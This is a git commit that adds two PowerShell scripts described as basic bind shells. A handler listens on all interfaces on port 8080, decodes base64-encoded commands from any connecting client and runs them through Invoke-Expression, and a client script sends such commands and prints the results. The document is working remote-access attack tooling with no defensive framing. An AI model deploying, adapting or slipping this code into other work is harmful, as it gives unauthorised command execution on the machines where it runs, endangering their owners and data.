b74abf25e5d98381c7ec4840ee30c788b36c6fc7
robert-gaines <robert.gaines@hushmail.com>
2022-03-21 20:01:18 -0700

    Adding basic bind shells

---
+++ Bind/PSClient.ps1
@@ -0,0 +1,48 @@
+﻿
+function PSClient($addr,$port)
+{
+
+    try
+    {
+
+        $s = New-Object Net.Sockets.TcpClient($addr,$port)
+
+        if($s)
+        {
+            Write-Host "Connected"
+        }
+    }
+    catch
+    {
+        return 
+    }
+
+    while($s.Connected)
+    {
+
+            $stream = $s.GetStream()
+            $transmitter = New-Object System.IO.StreamWriter($stream)
+            $receiver    = New-Object System.IO.StreamReader($stream)
+            $cmd         = Read-Host "[*]>>> "
+            $cmd         = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+            $cmd         = [Convert]::ToBase64String($cmd)
+            $transmitter.WriteLine($cmd)
+            $transmitter.Flush()
+
+            if($cmd | Select-String 'exit')
+            {
+                $s.Close()
+            }
+
+            $intake      = $receiver.ReadLine()
+            $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
+            $response    = $intake
+
+            if($intake)
+            {
+                Write-Host $response
+            }
+    }
+}
+
+PSClient localhost 8080
---
+++ Bind/PSHandler.ps1
@@ -0,0 +1,66 @@
+﻿
+
+function PSHandler($port)
+{
+    $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)
+
+    $handler = New-Object System.Net.Sockets.TCPListener $socket 
+
+    $handler.Start()
+
+    Write-Host "Listening on: $port"
+
+    while($true)
+    {
+        $client = $handler.AcceptTCPClient()
+
+        if($client)
+        {
+            $remoteAddress = $client.Client.RemoteEndPoint.Address
+            $remotePort    = $client.Client.RemoteEndPoint.Port 
+
+            Write-Host "Connection: $remoteAddress | $remotePort"
+
+            $stream = $client.GetStream()
+
+            $bytes = New-Object System.Byte[] 1024
+
+            $encodingScheme = New-Object System.Text.ASCIIEncoding
+
+            while(($var = $stream.Read($bytes,0,$bytes.Length)) -ne 0)
+            {
+                $cmd    = $encodingScheme.GetString($bytes,0,$var)
+                $cmd    = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cmd))
+
+                if($cmd)
+                {
+                    try
+                    {
+                        if($cmd | Select-String 'exit')
+                        {
+                            $client.Close()
+                        }
+                        else 
+                        {
+                            $result      = Invoke-Expression $cmd | Out-String 
+                            $result      = [System.Text.Encoding]::Unicode.GetBytes($result)
+                            $result      = [Convert]::ToBase64String($result)
+                            $transmitter = New-Object System.IO.StreamWriter($stream)
+                            $transmitter.WriteLine($result)
+                            $transmitter.Flush() 
+                        }
+                    }
+                    catch
+                    {
+                        continue
+                    }
+                }
+
+            }
+            $stream.Close()
+            $client.Close()
+        }
+    }
+}
+
+PSHandler 8080
